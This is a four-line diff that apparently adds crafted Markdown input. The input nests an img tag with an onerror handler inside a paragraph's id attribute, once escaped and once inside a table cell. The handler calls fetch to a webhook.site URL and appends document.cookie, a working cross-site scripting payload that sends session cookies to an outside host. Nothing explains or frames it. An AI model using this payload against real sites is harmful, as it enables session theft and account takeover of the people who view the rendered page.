@@ -1,0 +1,4 @@
+\<p id="<img src=x onerror='fetch(`https://webhook.site/6cfbdad2-751f-473b-8b1b-9b50c050ea82?`+document.cookie)'>">x</p>
+|<p id="|<img src=x onerror='fetch(`https://webhook.site/6cfbdad2-751f-473b-8b1b-9b50c050ea82?`+document.cookie)'>">x</p>|
+|-|-|
+|x|x|
